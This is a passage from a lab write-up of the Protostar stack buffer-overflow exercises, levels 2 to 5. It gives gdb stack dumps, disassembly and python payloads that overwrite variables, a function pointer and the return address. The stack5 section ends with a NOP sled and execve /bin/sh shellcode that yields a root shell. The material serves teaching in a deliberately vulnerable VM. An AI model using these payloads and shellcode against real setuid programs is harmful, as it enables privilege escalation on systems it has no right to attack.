esp + x58 location is put into eax and compared to 0xd0a0d0a. Therefore, by overflowing the value of that location needs to be changed to 0xd0a0d0a.(gdb) rStarting program: /opt/protostar/bin/stack2Breakpoint 1, 0x080484df in main (argc=1, argv=0xbffff824) at stack2/stack2.c:2020 stack2/stack2.c: No such file or directory. in stack2/stack2.c(gdb) x/30wx $esp0xbffff710: 0xbffff728 0xbffff9e4 0xb7fff8f8 0xb7f0186e0xbffff720: 0xb7fd7ff4 0xb7ec6165 0xbffff738 0xb7eada750xbffff730: 0xb7fd7ff4 0x08049748 0xbffff748 0x080483580xbffff740: 0xb7ff1040 0x08049748 0xbffff778 0x080485490xbffff750: 0xb7fd8304 0xb7fd7ff4 0x08048530 0xbffff7780xbffff760: 0xb7ec6365 0xb7ff1040 0x00000000 0xbffff9e40xbffff770: 0x08048530 0x00000000 0xbffff7f8 0xb7eadc760xbffff780: 0x00000001 0xbffff824(gdb) cContinuing.Breakpoint 2, main (argc=1, argv=0xbffff824) at stack2/stack2.c:2222 in stack2/stack2.c(gdb) x/30wx $esp0xbffff710: 0xbffff728 0xbffff9e4 0xb7fff8f8 0xb7f0186e0xbffff720: 0xb7fd7ff4 0xb7ec6165 0x41414141 0x414141410xbffff730: 0x41414141 0x41414141 0x41414141 0x414141410xbffff740: 0x41414141 0x41414141 0xbf004141 0x080485490xbffff750: 0xb7fd8304 0xb7fd7ff4 0x08048530 0xbffff7780xbffff760: 0xb7ec6365 0xb7ff1040 0x00000000 0xbffff9e40xbffff770: 0x08048530 0x00000000 0xbffff7f8 0xb7eadc760xbffff780: 0x00000001 0xbffff824After the strcpy, the 0x41’s can be easily located. The first 0x00000000 at …f768 is the value of the variable that needs to be modified. Calculating the number of bytes to overflow into that particular stack location, enter the A’s and then 0xd0a0d0a using python and re run the program after storing the value as the env variable.(gdb) rStarting program: /opt/protostar/bin/stack2Breakpoint 1, 0x080484df in main (argc=1, argv=0xbffff804) at stack2/stack2.c:2020 stack2/stack2.c: No such file or directory. in stack2/stack2.c(gdb) x/30wx $esp0xbffff6f0: 0xbffff708 0xbffff9c2 0xb7fff8f8 0xb7f0186e0xbffff700: 0xb7fd7ff4 0xb7ec6165 0xbffff718 0xb7eada750xbffff710: 0xb7fd7ff4 0x08049748 0xbffff728 0x080483580xbffff720: 0xb7ff1040 0x08049748 0xbffff758 0x080485490xbffff730: 0xb7fd8304 0xb7fd7ff4 0x08048530 0xbffff7580xbffff740: 0xb7ec6365 0xb7ff1040 0x00000000 0xbffff9c20xbffff750: 0x08048530 0x00000000 0xbffff7d8 0xb7eadc760xbffff760: 0x00000001 0xbffff804(gdb) cContinuing.Breakpoint 2, main (argc=1, argv=0xbffff804) at stack2/stack2.c:2222 in stack2/stack2.c(gdb) x/30wx $esp0xbffff6f0: 0xbffff708 0xbffff9c2 0xb7fff8f8 0xb7f0186e0xbffff700: 0xb7fd7ff4 0xb7ec6165 0x41414141 0x414141410xbffff710: 0x41414141 0x41414141 0x41414141 0x414141410xbffff720: 0x41414141 0x41414141 0x41414141 0x414141410xbffff730: 0x41414141 0x41414141 0x41414141 0x414141410xbffff740: 0x41414141 0x41414141 0x0d0a0d0a 0xbffff9000xbffff750: 0x08048530 0x00000000 0xbffff7d8 0xb7eadc760xbffff760: 0x00000001 0xbffff804The appropriate location is thus overwritten. Continuing the execution, the desired result is obtained.(gdb) cContinuing.you have correctly modified the variableProgram exited with code 051.Stack 3#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void win(){ printf(\"code flow successfully changed\\\\\\\\n\");}int main(int argc, char **argv){ volatile int (*fp)();//* char buffer[64]; fp = 0; gets(buffer); if(fp) { printf(\"calling function pointer, jumping to 0x%08x\\\\\\\\n\", fp); fp(); }}The code has a function declaration of win. The function is not called throughout the code so the challenge is to cause an overflow such that the address of the function win is passed onto the executable stack. The objdump -x for the executable shows that the stack has the permission of rwx. The pointer ‘fp’ is set to 0 after which a gets function is called which as known has the vulnerability of copying complete string passed into the memory. If ‘fp’ is overwritten successfully, then the if condition will turn out to be true and then ‘fp’ will be called which will in turn execute the function whose address is pointed by it. Therefore, the buffer needs to be overflowed with the address of the win function at the end overwriting the value of ‘fp’. Disassembling using gdb and setting the breakpoints before and after gets statement.(gdb) disas mainDump of assembler code for function main:0x08048438 &lt;main+0&gt;: push ebp0x08048439 &lt;main+1&gt;: mov ebp,esp0x0804843b &lt;main+3&gt;: and esp,0xfffffff00x0804843e &lt;main+6&gt;: sub esp,0x600x08048441 &lt;main+9&gt;: mov DWORD PTR [esp+0x5c],0x00x08048449 &lt;main+17&gt;: lea eax,[esp+0x1c]0x0804844d &lt;main+21&gt;: mov DWORD PTR [esp],eax0x08048450 &lt;main+24&gt;: call 0x8048330 &lt;gets@plt&gt;0x08048455 &lt;main+29&gt;: cmp DWORD PTR [esp+0x5c],0x00x0804845a &lt;main+34&gt;: je 0x8048477 &lt;main+63&gt;0x0804845c &lt;main+36&gt;: mov eax,0x80485600x08048461 &lt;main+41&gt;: mov edx,DWORD PTR [esp+0x5c]0x08048465 &lt;main+45&gt;: mov DWORD PTR [esp+0x4],edx0x08048469 &lt;main+49&gt;: mov DWORD PTR [esp],eax0x0804846c &lt;main+52&gt;: call 0x8048350 &lt;printf@plt&gt;0x08048471 &lt;main+57&gt;: mov eax,DWORD PTR [esp+0x5c]0x08048475 &lt;main+61&gt;: call eax0x08048477 &lt;main+63&gt;: leave 0x08048478 &lt;main+64&gt;: ret End of assembler dump.(gdb) break *main+24Breakpoint 1 at 0x8048450: file stack3/stack3.c, line 18.(gdb) break *main+29Breakpoint 2 at 0x8048455: file stack3/stack3.c, line 20.From the disassembled code, the location esp + x5c on the stack seems to be ‘fp’ which is set to 0. This is the value that needs to be overwritten. Running to find out start location of string using a bunch of A’s, and then calculating the number needed to overwrite ‘fp’.(gdb) rStarting program: /opt/protostar/bin/stack3Breakpoint 1, 0x08048450 in main (argc=1, argv=0xbffff864) at stack3/stack3.c:1818 stack3/stack3.c: No such file or directory. in stack3/stack3.c(gdb) x/24wx $esp0xbffff750: 0xbffff76c 0x00000001 0xb7fff8f8 0xb7f0186e0xbffff760: 0xb7fd7ff4 0xb7ec6165 0xbffff778 0xb7eada750xbffff770: 0xb7fd7ff4 0x0804967c 0xbffff788 0x0804830c0xbffff780: 0xb7ff1040 0x0804967c 0xbffff7b8 0x080484a90xbffff790: 0xb7fd8304 0xb7fd7ff4 0x08048490 0xbffff7b80xbffff7a0: 0xb7ec6365 0xb7ff1040 0x0804849b 0x00000000(gdb) cContinuing.AAAAAAAAAAAAAAAAAAAAAAAAAAAAABreakpoint 2, main (argc=1, argv=0xbffff864) at stack3/stack3.c:2020 in stack3/stack3.c(gdb) x/24wx $esp0xbffff750: 0xbffff76c 0x00000001 0xb7fff8f8 0xb7f0186e0xbffff760: 0xb7fd7ff4 0xb7ec6165 0xbffff778 0x414141410xbffff770: 0x41414141 0x41414141 0x41414141 0x414141410xbffff780: 0x41414141 0x41414141 0xbfff0041 0x080484a90xbffff790: 0xb7fd8304 0xb7fd7ff4 0x08048490 0xbffff7b80xbffff7a0: 0xb7ec6365 0xb7ff1040 0x0804849b 0x00000000The value 0x00000000 is the one that is to be overwritten. The number of A’s required to overwrite it is 16*4 plus the value that will overwrite. The value to be overwritten can be printed into a file and redirected. The value can be obtained by examining the win function.(gdb) x win0x8048424 &lt;win&gt;: 0x83e58955Therefore, redirecting the value to a file and redirecting that to gdb run.user@protostar:/opt/protostar/bin$ python -c 'print \"A\"*16*4 + \"\\\\\\\\x24\\\\\\\\x84\\\\\\\\x04\\\\\\\\x08\"' &gt; /tmp/inputfileuser@protostar:/opt/protostar/bin$ gdb ./stack3GNU gdb (GDB) 7.0.1-debianReading symbols from /opt/protostar/bin/stack3...done.(gdb) r &lt; /tmp/inputfileStarting program: /opt/protostar/bin/stack3 &lt; /tmp/inputfilecalling function pointer, jumping to 0x08048424code flow successfully changedProgram exited with code 037.Therefore, the given function was called using an overflow.Stack 4The code for this level is -#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void win(){ printf(\"code flow successfully changed\\\\\\\\n\");}int main(int argc, char **argv){ char buffer[64]; gets(buffer);}The code simply asks for the execution of the function ‘win’. For this the instruction pointer must be overwritten such that the address of the function ‘win’ is loaded onto the eip before the ret such that the function ‘win’ executes. Disassembling from gdb. Setting the breakpoint at the return instruction to examine the contents of the registers before exiting.(gdb) disas mainDump of assembler code for function main:0x08048408 &lt;main+0&gt;: push ebp0x08048409 &lt;main+1&gt;: mov ebp,esp0x0804840b &lt;main+3&gt;: and esp,0xfffffff00x0804840e &lt;main+6&gt;: sub esp,0x500x08048411 &lt;main+9&gt;: lea eax,[esp+0x10]0x08048415 &lt;main+13&gt;: mov DWORD PTR [esp],eax0x08048418 &lt;main+16&gt;: call 0x804830c &lt;gets@plt&gt;0x0804841d &lt;main+21&gt;: leave 0x0804841e &lt;main+22&gt;: ret End of assembler dump.(gdb) break *main+22Breakpoint 1 at 0x804841e: file stack4/stack4.c, line 16.Initially accuracy is not required therefore printed A to Z all characters in sets of 4 for easy identification in the stack. These characters are then put in a file in the home directory using python.python -c 'print \"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ\"' | cat &gt; helloNow we can run using this as the input by redirecting the file to r in gdb.(gdb) r &lt; ~/helloStarting program: /opt/protostar/bin/stack4 &lt; ~/helloBreakpoint 1, 0x0804841e in main (argc=Cannot access memory at address 0x5353535b) at stack4/stack4.c:1616 stack4/stack4.c: No such file or directory. in stack4/stack4.c(gdb) info registerseax 0xbffff770 -1073744016ecx 0xbffff770 -1073744016edx 0xb7fd9334 -1208118476ebx 0xb7fd7ff4 -1208123404esp 0xbffff7bc 0xbffff7bcebp 0x53535353 0x53535353esi 0x0 0edi 0x0 0eip 0x804841e 0x804841e &lt;main+22&gt;eflags 0x200246 [ PF ZF IF ID ]cs 0x73 115ss 0x7b 123ds 0x7b 123es 0x7b 123fs 0x0 0gs 0x33 51(gdb) cContinuing.Program received signal SIGSEGV, Segmentation fault.0x54545454 in ?? ()The base pointer was overwritten in the info. After continuing the eip changed to the set of 4 characters right after those of the base pointer because base pointer is also passed on the stack after the return address is passed. Therefore 54 was the value that got written in the eip which corresponds to the character ‘T’. Therefore if the T’s are replaced by the address of the ‘win’ function the execution will be transferred to that function. Using python again to print till s and then printing the address after checking from x win into the same file.user@protostar:~$ cat &gt; hello.pyimport sysfor i in \"ABCDEFGHIJKLMNOPQRS\": sys.stdout.write(i+i+i+i)user@protostar:~$ python hello.py &gt; hellouser@protostar:~$ cat helloAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSuser@protostar:~$ python -c 'print \"\\\\\\\\xf4\\\\\\\\x83\\\\\\\\x04\\\\\\\\x0\"' | cat &gt;&gt; helloAfter this the file hello will have the data required to be overflowed in the stack. After this, running by redirecting to gdb,(gdb) r &lt; ~/helloThe program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /opt/protostar/bin/stack4 &lt; ~/hellocode flow successfully changedProgram received signal SIGSEGV, Segmentation fault.0x00000000 in ?? ()The overflow still is there because the values after the eip have also been rearranged or overwritten in the stack. Therefore, another segfault is received but the function ‘win’ is successfully executed seeing as the code flow message was printed. Hence function executed using overflow.Stack 5The program has the following code -#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv){ char buffer[64]; gets(buffer);}The main objective seems to be redirecting the return of the program to get a shellcode. Using gdb to disassemble, and giving a breakpoint at the return statement to check the contents of the eip and stack.(gdb) disas mainDump of assembler code for function main:0x080483c4 &lt;main+0&gt;: push ebp0x080483c5 &lt;main+1&gt;: mov ebp,esp0x080483c7 &lt;main+3&gt;: and esp,0xfffffff00x080483ca &lt;main+6&gt;: sub esp,0x500x080483cd &lt;main+9&gt;: lea eax,[esp+0x10]0x080483d1 &lt;main+13&gt;: mov DWORD PTR [esp],eax0x080483d4 &lt;main+16&gt;: call 0x80482e8 &lt;gets@plt&gt;0x080483d9 &lt;main+21&gt;: leave 0x080483da &lt;main+22&gt;: ret End of assembler dump.(gdb) break *main+22Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.Giving the input file in the home directory with the contents “AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ”, for easy identification.(gdb) r &lt; ~/inputStarting program: /opt/protostar/bin/stack5 &lt; ~/input(gdb) x/24wx $esp0xbffff6bc: 0x54545454 0x55555555 0x56565656 0x575757570xbffff6cc: 0x58585858 0x59595959 0x5a5a5a5a 0xb7ffef000xbffff6dc: 0x08048232 0x00000001 0xbffff720 0xb7ff06260xbffff6ec: 0xb7fffab0 0xb7fe1b28 0xb7fd7ff4 0x000000000xbffff6fc: 0x00000000 0xbffff738 0xa47e1986 0x8e2bef960xbffff70c: 0x00000000 0x00000000 0x00000000 0x00000001(gdb) siCannot access memory at address 0x53535357(gdb)Program received signal SIGSEGV, Segmentation fault.0x54545454 in ?? ()(gdb) info registerseax 0xbffff670 -1073744272ecx 0xbffff670 -1073744272edx 0xb7fd9334 -1208118476ebx 0xb7fd7ff4 -1208123404esp 0xbffff6c0 0xbffff6c0ebp 0x53535353 0x53535353esi 0x0 0edi 0x0 0eip 0x54545454 0x54545454eflags 0x210246 [ PF ZF IF RF ID ]cs 0x73 115ss 0x7b 123ds 0x7b 123es 0x7b 123fs 0x0 0gs 0x33 51As seen the eip is overwritten by 0x54’s which is the hex for ‘T’. Therefore, upto before T, we get a seg fault and T will rewrite the eip. To create a NOP sled, add 200 NOPs and then a shellcode from shellstorm. Placing the address next to that of the T’s as the jump address at the eip, the interrupt works once but from the home directory gives an illegal instruction. This is so because of the address randomization and changes due to directory holding parameters etc. Therefore, NOP sled is added and then the address for the jump is made to 30 more than the immediately next stack pointer to aid the sled to reach the sigtrap. After this the code is the following.import structa = struct.pack(\"I\", 0xbffff6f0)print(\"A\"*19*4 + a + \"\\\\\\\\x90\"*100 + \"\\\\\\\\xcc\"*4)Now to execute the exploit, the shellcode needs to be placed in place of the sig traps.import structa = struct.pack(\"I\", 0xbffff6f0)print(\"A\"*19*4 + a + \"\\\\\\\\x90\"*100 + \"\\\\\\\\x31\\\\\\\\xc0\\\\\\\\x50\\\\\\\\x68\\\\\\\\x2f\\\\\\\\x2f\\\\\\\\x73\\\\\\\\x68\\\\\\\\x68\\\\\\\\x2f\\\\\\\\x62\\\\\\\\x69\\\\\\\\x6e\\\\\\\\x89\\\\\\\\xe3\\\\\\\\x89\\\\\\\\xc1\\\\\\\\x89\\\\\\\\xc2\\\\\\\\xb0\\\\\\\\x0b\\\\\\\\xcd\\\\\\\\x80\\\\\\\\x31\\\\\\\\xc0\\\\\\\\x40\\\\\\\\xcd\\\\\\\\x80\")By executing this code and piping the output to the executable the shell does work but exits. Execve replaces the current process and thus the current one exits which is connected to the stdin. After this process ends, the stdin gives EOF to the input of the shell that has been executed. This can be confirmed when the /bin/dash is executed and exits. Therefore, to keep the stdin open for the shell, the command cat is used which will help redirect the input to the shell and print the output to stdout.user@protostar:~$ (python pp.py; cat) | /opt/protostar/bin/stack5iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)whoamirootThus the exploit helps execute the shell to get root." } ]
